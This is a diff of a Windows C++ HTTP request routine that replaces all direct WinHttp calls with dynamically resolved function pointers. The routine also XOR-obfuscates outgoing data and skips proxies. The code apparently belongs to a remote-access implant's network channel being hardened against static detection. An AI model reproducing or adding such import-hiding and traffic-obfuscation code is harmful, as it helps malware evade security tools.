@@ -15,6 +15,8 @@
 
 #include <Shlwapi.h>
 
+#include "api.h"
+
 #pragma comment(lib,"shlwapi.lib")
 
 
@@ -247,21 +249,21 @@ bool HttpProto::httpRequest(char* data, int datasize)
     DWORD btsWritten = 0, size_ = 0, btsRead = 0;
     bool sendok = true;
 
-    hSession = WinHttpOpen(MY_USERAGENT, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    hSession = lpWinHttpOpen(MY_USERAGENT, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) {
 		runLog("%s %s WinHttpOpen error\r\n", __FILE__, __FUNCTION__);
         sendok = false;
         return sendok;
     }
 
-    hConnect = WinHttpConnect(hSession, m_ip, m_port, 0);
+    hConnect = lpWinHttpConnect(hSession, m_ip, m_port, 0);
     if (!hConnect) {
 		runLog("%s %s WinHttpOpen WinHttpConnect\r\n", __FILE__, __FUNCTION__);
         sendok = false;
         return sendok;
     }
 
-    hRequest = WinHttpOpenRequest(hConnect, m_action.c_str(), m_app, 0, WINHTTP_NO_REFERER, NULL, 0);        //WINHTTP_NO_REFERER
+    hRequest = lpWinHttpOpenRequest(hConnect, m_action.c_str(), m_app, 0, WINHTTP_NO_REFERER, NULL, 0);        //WINHTTP_NO_REFERER
     if (!hRequest) {
 		runLog("%s %s WinHttpOpen WinHttpOpenRequest\r\n", __FILE__, __FUNCTION__);
         sendok = false;
@@ -269,7 +271,7 @@ bool HttpProto::httpRequest(char* data, int datasize)
     }
 
 	DWORD dwOption = WINHTTP_DECOMPRESSION_FLAG_ALL;
-	opSuccess = WinHttpSetOption(hRequest, WINHTTP_OPTION_DECOMPRESSION, &dwOption, sizeof(dwOption));
+	opSuccess = lpWinHttpSetOption(hRequest, WINHTTP_OPTION_DECOMPRESSION, &dwOption, sizeof(dwOption));
 
 	std::wstring gzip = L"";
 	BuildGzip(gzip);
@@ -293,13 +295,13 @@ bool HttpProto::httpRequest(char* data, int datasize)
 
     std::wstring cl;
     BuildContentLength(datasize, cl);
-    opSuccess = WinHttpAddRequestHeaders(hRequest, cl.c_str(), -1L, 0);
+    opSuccess = lpWinHttpAddRequestHeaders(hRequest, cl.c_str(), -1L, 0);
     if (!opSuccess) {
         sendok = false;
         return sendok;
     }
 
-    opSuccess = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, datasize, 0);
+    opSuccess = lpWinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, datasize, 0);
     if (!opSuccess) {
         sendok = false;
         return sendok;
@@ -309,14 +311,14 @@ bool HttpProto::httpRequest(char* data, int datasize)
     {
 		xor_crypt(data, datasize);
 
-		opSuccess = WinHttpWriteData(hRequest, data, datasize, &btsWritten);
+		opSuccess = lpWinHttpWriteData(hRequest, data, datasize, &btsWritten);
 		if (!opSuccess) {
 			sendok = false;
 			return sendok;
 		}
     }
 
-    opSuccess = WinHttpReceiveResponse(hRequest, 0);
+    opSuccess = lpWinHttpReceiveResponse(hRequest, 0);
     if (!opSuccess) {
         sendok = false;
         return sendok;
@@ -324,7 +326,7 @@ bool HttpProto::httpRequest(char* data, int datasize)
 
 	vector<char*> response;
 	int respLen = 0;
-	opSuccess = WinHttpQueryDataAvailable(hRequest, &size_);
+	opSuccess = lpWinHttpQueryDataAvailable(hRequest, &size_);
 	if (size_ > 0 && opSuccess) {		
 		int freesize = BUFFER_SIZE;
 		char* databuf = new char[BUFFER_SIZE];
@@ -334,11 +336,11 @@ bool HttpProto::httpRequest(char* data, int datasize)
 		{
 			if (size_ > freesize)
 			{
-				opSuccess = WinHttpReadData(hRequest, databuf, freesize, &btsRead);
+				opSuccess = lpWinHttpReadData(hRequest, databuf, freesize, &btsRead);
 			}
 			else
 			{
-				opSuccess = WinHttpReadData(hRequest, databuf, size_, &btsRead);
+				opSuccess = lpWinHttpReadData(hRequest, databuf, size_, &btsRead);
 			}
 			if (opSuccess == 0 || btsRead <= 0)
 			{
@@ -355,7 +357,7 @@ bool HttpProto::httpRequest(char* data, int datasize)
 				response.push_back(databuf);
 			}
 
-			opSuccess = WinHttpQueryDataAvailable(hRequest, &size_);
+			opSuccess = lpWinHttpQueryDataAvailable(hRequest, &size_);
 		}
 	}
 
@@ -378,15 +380,15 @@ bool HttpProto::httpRequest(char* data, int datasize)
 	}
 
     if (hSession) {
-        WinHttpCloseHandle(hSession);
+		lpWinHttpCloseHandle(hSession);
     }
 
     if (hConnect) {
-        WinHttpCloseHandle(hConnect);
+		lpWinHttpCloseHandle(hConnect);
     }
 
     if (hRequest) {
-        WinHttpCloseHandle(hRequest);
+		lpWinHttpCloseHandle(hRequest);
     }
     return sendok;
 }
